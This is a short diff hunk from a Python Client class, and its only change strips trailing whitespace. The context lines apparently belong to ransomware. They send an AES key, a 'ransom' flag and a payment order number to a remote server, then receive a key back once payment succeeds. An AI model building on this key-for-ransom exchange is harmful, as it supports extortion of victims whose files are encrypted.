@@ -68,7 +68,7 @@ class Client():
             'aes_key': self.aes_key,
             'ransom': True,
             'out_trade_no': out_trade_no
-        }        
+        }
         res = self.post_server(data, GET_URL + self.id)
         if res['status'] == 'success':
             self.aes_key = res['aes_key']
